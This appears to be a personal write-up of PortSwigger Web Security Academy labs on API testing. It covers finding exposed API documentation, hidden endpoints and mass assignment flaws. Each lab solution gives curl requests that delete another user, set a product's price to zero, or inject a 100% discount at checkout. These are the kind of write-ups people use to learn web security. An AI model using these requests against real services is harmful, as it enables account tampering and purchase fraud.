# API Testing

This writeup covers the learning path *API_testing* on Portswigger.

## Part 1: API Exploitation using API Documentation (API recon)

APIs are meant for other developers to integrate with, this means there must be a way of conveying how to access and use the API correctly. For open APIs this kind of documentation is openly available. Sometimes documentation might not be openly available. Luckily (for us) there are standards which are often used for supplying API documentation. These specific endpoints are commonly:

- /api (root of the API endpoint)
- /swagger/index.html
- /openapi.json

Furthermore fuzzing is a viable option for discovering the endpoints of an API. Fuzzing is basically using a bruteforce tool like dirbuster or similar in order to discover common endpoints on the host.

## Lab: Exploiting an API endpoing using documentation

**Lab Description**: To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: `wiener:peter`.

### Lab solution

We are met with an online shop. Using the network tab of the browser we try to login. We see that there is an update email function. This might use the same api which is used to delete accounts, therefore we try to change the email of our own account in order to see if we can identify useful information about the api:

Changing the email sent a request to: `https://0add00b20482968782d7023000da0072.web-security-academy.net/resources/js/api/changeEmail.js`

This script is using a javascript file in the resources folder. Lets try to see if we can access some documentation, using said javascript file.

From the JS file it is seen that is uses the url from the forms action tag:

```js
const changeEmail = (form, e) => {
    e.preventDefault();

    const formData = new FormData(form);
    const username = formData.get('username');
    const email = formData.get('email');

    fetch(
        `${form.action}/${encodeURIComponent(username)}`,
        {
            method: 'PATCH',
            body: JSON.stringify({ 'email': email })
        }
    )
        .then(res => res.json())
        .then(handleResponse(displayErrorMessage(form)));
};
```

Looking at this, we see that the api is located at `/api/user`.
Using the knowledge we learned earlier about API documentation, we try to visit the various endpoints. Going to `/api` yields documentation for the api:

```text
GET /user/[username: String] { } 200 OK, User
DELETE /user/[username: String] { } 200 OK, Result
PATCH /user/[username: String] {"email": String} 200 OK, User
```

In order to solve the lab, we simply create a curl request to the `/api/user/carlos` endpoint with the HTTP method `DELETE`:

```curl
curl -X DELETE https://0add00b20482968782d7023000da0072.web-security-academy.net/api/user/carlos
```

Or so we believed. The status message returned `Unauthorized`. Going back to the API documentation, we notice that the API documentation is clickable and presents a `test` functionality, leading to believe that the server might be authorized to delete carlos. An luckily, it is! lab solved.

### Using machine readable documentation

If we find machine readable documentation when doing API recon, it can be advangtageous to use a tool such as Burp Scanner or Postman to crawl and audit the documentation.

### Identifying API endpoints

As we did in the previous lab, it can prove fruitful to look at an application which is using the API we are testing. Looking at network requests containing `/api/` or going through javascript files in order to discover endpoints.

A great next step after identifying API endpoints is to interact with the endpoint by chaning the HTTP method or chaning headers such as media-type and/or content-type, in order to see error messages and how the API behaves.

**Note:** a good idea when testing API endpoints is to try and test all potential HTTP methods on the endpoint. Be diligent when testing, and target only low priority objects!

It is important to check for difference in handling of content types. Some APIs are vulnerable to injection if the supplied content type differs from the commonly used content type. (Example, JSON is safe, XML is vulnerable.)

## Lab: Finding and exploiting an unused API endpoint

**Lab Description**: To solve the lab, exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: `wiener:peter`.

### Lab solution

We are told to find and exploit a hidden API endpoint. Lets start by loggin in again. We are again able to update the email, yet we also see a *Store Credit* amount which might be interesting.
Looking through the resources folder we see the script `productPrice.js`. Inside this JS script the webpage loads the prices of different items using the api:

```js
const loadPricing = (productId) => {
    const url = new URL(location);
    fetch(`//${url.host}/api/products/${encodeURIComponent(productId)}/price`)
        .then(res => res.json())
        .then(handleResponse(getAddToCartForm()));
```

It is seen that the product ID is being used to fetch the price of the product. We can try to find this ID by going to the store. We want this in order to be able to interact with the API ourselves.

We see that the l33t leatherjacket we are supposed to buy has ID `1`. Now constructing a request to the api for the price:

```curl
curl https://0abf007c03b828ef80eec15c009800b6.web-security-academy.net/api/products/1/price

{"price":"$1337.00","message":"This item is in high demand - 10 purchased in the last 2h"}
```

This means we have found the correct API path.

An idea is to alter the price of the product in order for us to buy it without adding any credit. Changing the HTTP method on the product price endpoint to `PATCH` yields and "Unauthorized" status message. Both `DELETE` and `POST` are not allowed. We can try supplying our session token to see if logging in mitigates the authorization.

Sending the curl request: `curl -X PATCH https://0abf007c03b828ef80eec15c009800b6.web-security-academy.net/api/products/1/price -H 'Cookie: session=9ae9AcPIvAl3xYb4WAqM4p6uRh7wQ0SS'` where the session cookie is included provides us with the response: `{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}` As we did not supply any content-type or any content for that matter, this is a good indication that we are able to send requests to the endpoint with the session cookie.

Adding the content-type header for json and sending an empty body provides us with the following error message:

```curl
curl -X PATCH https://0abf007c03b828ef80eec15c009800b6.web-security-academy.net/api/products/1/price -H 'Cookie: session=9ae9AcPIvAl3xYb4WAqM4p6uRh7wQ0SS' -H 'Content-Type: application/json' -d '{}'

{"type":"ClientError","code":400,"error":"'price' parameter missing in body"}
```

It seems like we are able to change the price by including a JSON body with a price parameter like so: `{"price": 0}`. the response is: `{"price":"$0.00"}`. Refreshing the site shows the new updated price of 0 dollars! We add to cart and checkout to solve this lab!

```curl
curl -X PATCH https://0abf007c03b828ef80eec15c009800b6.web-security-academy.net/api/products/1/price -H 'Cookie: session=9ae9AcPIvAl3xYb4WAqM4p6uRh7wQ0SS' -H 'Content-Type: application/json' -d '{"price": 0}'
```

### Fuzzing to find hidden endpoints

When an initial API endpoint has been found it is very useful to fuzz using wordlists consisting of naming conventions and common industry terms.

### Finding hidden parameters

It is also possible to fuzz for parameters which the API endpoints support using Burp intruder.

## Mass assignment vulnerabilities

Mass assignment or auto-binding is a vulnerability which can occur when software frameworks automatically bind request parameters to fields on an object. This means that the object might have additional parameters which the developer was unaware of or did not intend for to be processed. These can be exploited by an attacker.

An example is a PATCH request to a user application like the following:

```JSON
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

the backend might return the full object when a PATCH has been processed. The response could look like:

```JSON
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

This could show that ID and isAdmin parameters are bound to the user object. Testing for mass assignment is done by adding the hidden parameter to a PATCH request (could also be POST, if a new object is created). Then inserting a valid value and an invalid one. If the server behaves differently, it could suggest that mass assignment is present.

## Lab: xploiting a mass assignment vulnerability

**Lab Description**: To solve the lab, find and exploit a mass assignment vulnerability to buy a Lightweight l33t Leather Jacket. You can log in to your own account using the following credentials: `wiener:peter`.

### Lab solution

Initially I had trouble finding the actual API endpoint, but when interacting with the cart, it is an API endpoint which is requested, during checkout. Placing an order for the jacket will fail as the api will respond with a GET request containing:

```JSON
{
    "chosen_discount": {
        "percentage": 0
        },
    "chosen_products": [{
            "product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700
        }]
}
```

Looking at this get request we see the `chosen_discount`parameter which is not present in the POST request created when calling the same API endpoint.

Adding a chosen discound of 100 percent should allow us to buy the jacket. This is done by adding the chosen_discount object to the POST request:

```curl
curl -X POST https://0aa2008304194bee82ae602b009500fe.web-security-academy.net/api/checkout -d'{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}' -H 'Cookie: session=SZseUaiOmShMxsE8X6rVeYjOV49KENlM'
```

This solved the lab.
